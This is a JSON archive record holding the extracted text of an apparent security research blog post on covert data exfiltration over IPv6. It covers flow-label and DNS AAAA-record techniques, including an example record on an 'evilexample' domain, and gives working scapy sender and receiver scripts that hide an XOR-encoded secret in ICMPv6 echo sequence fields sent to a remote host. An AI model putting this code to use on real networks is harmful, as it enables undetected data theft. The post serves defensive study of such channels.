{
    "id": "2f7bbab0-e1d3-4dc8-bbea-376c315f7078",
    "created_at": "2023-01-12T14:59:49.524792Z",
    "updated_at": "2025-03-27T02:05:57.939727Z",
    "deleted_at": null,
    "sha1_hash": "19ab4a4377623125c8110217fe2767fbf523bb18",
    "title": "2020-10-27 - Data exfiltration via IPv6",
    "authors": "",
    "file_creation_date": "2022-05-29T00:57:00Z",
    "file_modification_date": "2022-05-29T00:57:00Z",
    "file_size": 184280,
    "plain_text": "# Data exfiltration via IPv6\n\n**blog.avast.com/data-exfiltration-via-ipv6-avast**\n\n[Lisandro Ubiedo 27 Oct 2020](https://blog.avast.com/author/lisandro-ubiedo)\n\nTesting the capabilities of IPv6 and how malware could take advantage of it\n\nWithin the [Aposemat Team, we’ve been working on testing the capabilities of IPv6 and how](https://www.stratosphereips.org/aposemat/)\nmalware could take advantage of it. One of the topics we explored was exfiltration of data via\nthe IPv6 protocol. In this post, we share our study into this topic.\n\n## What is exfiltration?\n\nExfiltration is the unauthorized exportation of sensitive data out of the network by connecting\nto an external destination and/or using covert channels. The latter is commonly used to\nexfiltrate information while being undetected or avoid any measure in place to stop the\n[migration of data. There have been numerous studies on this topic, and even to this day,](https://www.securityweek.com/researchers-devise-perfect-data-exfiltration-technique)\ndata theft produced by breaches put exfiltration in the center of attention.\n\nTo exfiltrate data, networking and transportation layers (shown in Figure 1) are commonly\nused as are low level layers that would require deep packet inspection to find occurrences or\nidentify that the exfiltration is happening. They also provide fields and portions of data in the\npacket headers that are not commonly used or zeroed out. These sections can be used to\nstore portions of data and could be unnoticed by analyzing the packet captures.\n\n\n-----\n\n**_Figure 1. OSI Model and description of its layers. Layers 3 and 4 are highlighted in light_**\n_orange and yellow respectively. (Source:_ _[Wikipedia)](https://en.wikipedia.org/wiki/OSI_model)_\n\n## Tools of the trade\n\nSeveral tools exist to carry out exfiltration via IPv6 network stack. We’ll describe IPv6teal\nand IPv6DNSExfil, and how these tools are used to exfiltrate data via IPv6.\n\n### IPv6teal\n\nThe first one is [IPv6teal and consists of a receiver and sender (exfiltrate) script. This tools](https://github.com/christophetd/IPv6teal)\nmakes use of the [Flow Label field which is used to label sequences of packets and it has a](https://tools.ietf.org/html/rfc8200#section-6)\nfixed size of 20 bits (detailed in Figure 2). It makes use of this specific field because it could\n\n\n-----\n\nbe variable and contains custom bits without impact on the packet reaching its destination.\nThis detail makes a good candidate for storing data that could reach an endpoint safely while\nbeing hidden in normal traffic.\n\n**_Figure 2. IPv6 packet header structure with Flow Label field (marked red)._**\n_(Source:_ _[Wikipedia)](https://en.wikipedia.org/wiki/IPv6_packet)_\n\nTo be able to fit more data in fewer packets the author decided to use GZIP compression to\naccomplish this. In our tests, it took approximately two seconds and 15 packets to send a\nplain-text file containing the string THISISASECRET across the internet. The information is\ntransmitted with a magic value that marks the start and end of the flow of data. These magic\nvalues also add more information about the data being transmitted.\n\nThe flow of packets for our test end up being built this way:\n\n\n-----\n\nThe packets are built over two upper layers: the IPv6 layer and a “Raw” layer, which is only\ndata appended to the last layer. The raw layer holds the magic values, discussed earlier, and\ntells the receiver when a transmission starts, how many bits are going to be transmitted and\nhow many packets will be transmitted, not counting the packet ending the transmission.\n\nAnother exfiltration technique, on a higher level of the OSI Model, is done via DNS AAAA\nrecords. The [AAAA records were designed to be used with IPv6 addresses. When a client](https://tools.ietf.org/html/rfc3596#page-3)\nrequests the IPv6 address of a domain it will utilize this record in order to get it from a DNS\nserver. Although TXT records were commonly used for this as they can hold human-readable\ndata, as well as machine-readable, queries to TXT records are less common and could be\ncaught quickly during an study of the network flow.\n\n### IPv6DNSExfil\n\n[Tools like IPv6DNSExfil make use of this technique in order to store a secret, in a pseudo-](https://github.com/DShield-ISC/IPv6DNSExfil)\nIPv6 address format, for a short period of time on AAAA records. It will make use of the\n[nsupdate tool to dynamically create said AAAA records and push them to an upstream DNS](https://linux.die.net/man/1/nsupdate)\nserver thus exfiltrating the information. A record created this way, using the same secret that\nwe utilized previously, will look like this:\n\n**a.evilexample.com. 10 AAAA 2000:5448:4953:4953:4153:4543:5245:5400**\n\n**T H I S I S A S E C R E T**\n\n**DNS record**\n\n\n-----\n\nTTL\nRecord Type\nData\n\nOnce the record is put in place the attackers can utilize this data as they please, either by\n[using it as a C&C (as suggested by the author) or to just transfer the information from one](https://isc.sans.edu/forums/diary/Command+and+Control+Channels+Using+AAAA+DNS+Records/21301/)\nendpoint to another with DNS queries to that specific server.\n\n## Custom exfiltration methods\n\n[Libraries like scapy, for Python, make it easier for developers to interact with networking](https://github.com/secdev/scapy)\nabstractions at a higher level. For example, with only two lines of code we are able to send a\ncrafted packet to an IPv6 endpoint:\n\n% sudo python3\n\nPython 3.5.2 (default, Jul 10 2019, 11:58:48)\n\n[GCC 5.4.0 20160609] on linux\n\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n\n**>>>** **from** **scapy.all** **import IPv6,Raw,send**\n\n**>>> send(IPv6(dst=\"XXXX:XXX:X:1662:7a8a:20ff:fe43:93d4\")/Raw(load=\"test\"))**\n\n**.**\n\n**Sent 1 packets.**\n\nAnd sniffing on the other endpoint we can see the packet reaching its destination with the\nextra raw layer that where we included the “test” string:\n\n**# tcpdump -s0 -l -X -i eth0 'ip6 and not icmp6'**\n\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\n\nlistening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\n\n23:47:15.996483 IP6 XXXX:XXX:X:1663::1ce > XXXX:XXX:X:1662:7a8a:20ff:fe43:93d4: no\nnext header\n\n0x0000: 6000 0000 0004 3b3e XXXX XXXX XXXX 1663 `.....;>.......c\n\n0x0010: 0000 0000 0000 01ce XXXX XXXX XXXX 1662 ...............b\n\n0x0020: 7a8a 20ff fe43 93d4 7465 7374 0000    z....C..test..\n\nUsing this same approach we can start generating traffic dynamically using scapy instead of\njust sending packets without an upper transportation layer. One case would be making use of\n[ICMPv6 protocol, which is an improved version of its IPv4 relative. A “classic” exfiltration](https://tools.ietf.org/html/rfc4443)\nmethod using this protocol is using the echo and reply messages (commonly used by ping6\nnetworking tool) to send data outside the network without establishing a connection like TCP.\nThis way we can send specific chunks of data over IPv6 via ICMPv6 echo requests to a\nremote host sniffing the network. Take a look at this code, for example:\n\n\n-----\n\nfrom scapy.all import IPv6,ICMPv6EchoRequest,send\nimport\n\nsys\n\nsecret  = \"THISISASECRET\" # hidden info stored in the packet\nendpoint = sys.argv[1] # addr where are we sending the data\n\n_# taken from a random ping6 packet_\n_#    0x0030: 1e38 2c5f 0000 0000 4434 0100 0000 0000 .8,_....D4......_\n_#    0x0040: 1011 1213 1415 1617 1819 1a1b 1c1d 1e1f ................_\n_#    0x0050: 2021 2223 2425 2627 2829 2a2b 2c2d 2e2f .!\"#$%&'()*+,-./_\n_#    0x0060: 3031 3233 3435 3637           01234567_\ndata = \"\\x1e\\x38\\x2c\\x5f\\x00\\x00\\x00\\x00\\x44\\x34\\x01\\x00\\x00\\x00\\x00\\x00\"\n\\     \"\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\"\n\\     \"\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\"\n\\     \"\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\"\n\ndef sendpkt(d):\nif len(d) == 2:\nseq = (ord(d[0])<<8) + ord(d[1])\nelse:\nseq = ord(d)\n**send(IPv6(dst=endpoint)/ICMPv6EchoRequest(id=0x1337,seq=seq, data=data))**\n\n_# encrypt data with key 0x17_\nxor = lambda x: ''.join([ chr(ord(c)^0x17) for c in x])\n\ni=0\nfor b in range(0, len(secret), 2):\nsendpkt(xor(secret[b:b+2]))\n\nThis script will make use of the secret string we have been sending previously, encrypt it\nusing the XOR cipher, and send each two bytes of that secret encrypted string via an\nICMPv6 echo request with an specific ID. Those two bytes are hidden in the sequence field,\nwhich is a short integer field, and can be decrypted on destination by a receiver. Also, we are\nsetting up the packet with an specific ID (in this case 0x1337) because we want to easily\nrecognize the packet as one of ours among the flow of networking traffic. So, let’s send a\nsecret!\n\n% sudo python3 ipv6_icmp6_exfil.py XXXX:XXX:X:1663::1ce\n.\nSent 1 packets.\n\n\n-----\n\nSent 1 packets.\n.\nSent 1 packets.\n.\nSent 1 packets.\n.\nSent 1 packets.\n.\nSent 1 packets.\n.\nSent 1 packets.\n\nFrom the other side of the line, there’s going to be a receiver. The receiver will check the ID\nof the ICMPv6 echo request and, if it matches, it will decode the data being sent over the\nsequence field. The code looks like this:\n\n**from** **scapy.all** **import sniff,IPv6,ICMPv6EchoRequest**\n**import**\n\n**sys**\n\nxor = lambda x: chr(x ^ 0x17)\n\n**def pkt(p):**\n**if 'ICMPv6EchoRequest' in p and p['ICMPv6EchoRequest'].id == 0x1337:**\ns = p['ICMPv6EchoRequest'].seq\nprint(xor((s & 0xff00)>>8) + xor(s & 0xff), end='')\nsys.stdout.\n\nflush()\n\nsniff(filter=\"ip6 and icmp6\", prn=pkt)\n\nAfter running it, the script will sniff the network for IPv6 and ICMPv6 packets, specifically.\nThis network sniffing is powered by tcpdump filters which will process packets that could be\nof our interests. Once the packet is captured is processed by the pkt() function which will\ncheck the ICMPv6 ID and if it matches to the ID we are looking for it will decrypt the\ninformation and print it to the screen:\n\n% sudo python3 ipv6_icmp6_recv.py\n**THISISASECRET**\n\nThe process can be explained in a simpler way via the next flow graph:\n\n\n-----\n\n**_Figure 3. Packets with encrypted data in the sequence field are received and decrypted._**\n\nThe proof-of-concept highlighted here took the same time as, for example, IPv6teal with 2\nseconds to transmit the secret string and mimics (almost) normal ICMPv6 that ping6\nproduces. We did a test with 1 kilobyte of data to be transmitted using this technique across\nthe internet and it took 8 minutes and 42 seconds to complete the task.\n\n## In summary\n\nIPv6 is growing in popularity as well as the necessity for more addressing space. Although,\n[the percentage of IPv6 adoption worldwide is lower than 35% mostly because it still requires](https://www.google.com/intl/en/ipv6/statistics.html#tab=ipv6-adoption)\na big effort and investment from companies and organizations. This means that the tools and\ntechniques demonstrated in this article will take time to be fully adopted or used while leaving\nspace to further develop more ideas and methodologies.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-10-27 - Data exfiltration via IPv6.pdf"
    ],
    "report_names": [
        "2020-10-27 - Data exfiltration via IPv6.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535589,
    "ts_updated_at": 1743041157,
    "ts_creation_date": 1653785820,
    "ts_modification_date": 1653785820,
    "files": {
        "pdf": "https://archive.orkl.eu/19ab4a4377623125c8110217fe2767fbf523bb18.pdf",
        "text": "https://archive.orkl.eu/19ab4a4377623125c8110217fe2767fbf523bb18.txt",
        "img": "https://archive.orkl.eu/19ab4a4377623125c8110217fe2767fbf523bb18.jpg"
    }
}